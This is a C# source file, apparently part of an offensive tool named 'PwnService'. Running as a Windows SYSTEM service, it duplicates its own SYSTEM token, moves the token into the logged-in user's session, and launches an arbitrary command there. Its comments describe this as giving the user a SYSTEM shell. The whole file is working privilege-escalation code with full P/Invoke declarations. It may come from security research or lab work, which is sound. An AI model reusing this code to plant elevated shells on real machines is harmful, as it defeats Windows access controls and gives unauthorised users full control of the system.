using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PwnService
{
    static class RunProcessAs
    {
        /* ADVAPI32.DLL ********************************************************************************************************/
        // https://www.pinvoke.net/default.aspx/advapi32.openprocesstoken
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
                                            UInt32 DesiredAccess, out IntPtr TokenHandle);

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                                                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                                                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                                                TOKEN_ADJUST_SESSIONID);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken,
                                                   uint dwDesiredAccess,
                                                   ref SECURITY_ATTRIBUTES lpTokenAttributes,
                                                   SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                                                   TOKEN_TYPE TokenType,
                                                   out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary,
            TokenImpersonation
        }

        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcessAsUser(IntPtr hToken,
                                               string lpApplicationName,
                                               string lpCommandLine,
                                               ref SECURITY_ATTRIBUTES lpProcessAttributes,
                                               ref SECURITY_ATTRIBUTES lpThreadAttributes,
                                               bool bInheritHandles,
                                               uint dwCreationFlags,
                                               IntPtr lpEnvironment,
                                               string lpCurrentDirectory,
                                               ref STARTUPINFO lpStartupInfo,
                                               out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public const int CREATE_NEW_CONSOLE = 0x00000010;
        public const uint MAXIMUM_ALLOWED = 0x2000000;

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern Boolean SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
                                                  ref UInt32 TokenInformation, UInt32 TokenInformationLength);


        /* KERNEL32.DLL *******************************************************************************************************/
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hSnapshot);

        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();


        /* RUN AS **************************************************************************************************************/
        /**
         * In order to give a SYSTEM shell to the currently logged in user, we're going to:
         *  - get a reference of the token of this process running as SYSTEM
         *  - duplicate the token
         *  - set the token'd sessionID to be that of the currently logged in user
         *  - start a process with this impersonated token
         *  And this is going to start a SYSTEM process in the user's windows session!
         * 
         * This is well explained here as well https://stackoverflow.com/questions/10770929/run-application-on-win7-logon-screen/10778855?s=6|41.5437#10778855
         */
        public static bool RunCmdInUsersSession(string cmd, EventLog eventLog)
        {
            /* get a handle to this process' token with SYSTEM privileges */
            Boolean ret = OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_READ | TOKEN_DUPLICATE, out IntPtr tokenHandle);
            if (!ret)
            {
                eventLog.WriteEntry("Failed opening process token");
                return false;
            }

            /* duplicate it as a new impersonation token */
            var sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(sa);
            ret = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenImpersonation, out IntPtr dupedToken);
            if (!ret)
            {
                eventLog.WriteEntry("Failed duplicating process token");
                return false;
            }

            /* get the interactive user's sessionID */
            uint dwSessionId = WTSGetActiveConsoleSessionId();

            /* modify the impersonated token to use the user's sessionID */
            ret = SetTokenInformation(dupedToken, TOKEN_INFORMATION_CLASS.TokenSessionId, ref dwSessionId, (uint)IntPtr.Size);
            if (!ret)
            {
                eventLog.WriteEntry(String.Format("Failed setting token sessionId {0}", dwSessionId));
                return false;
            }

            /* spawn a SYSTEM shell in the user's environment */
            STARTUPINFO info = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            ret = CreateProcessAsUser(dupedToken, null, cmd, ref sa, ref sa, false, CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref info, out procInfo);
            if (!ret)
            {
                eventLog.WriteEntry("Failed creating process");
                return false;
            }

            CloseHandle(tokenHandle);
            CloseHandle(dupedToken);

            return true;
        }
    }
}
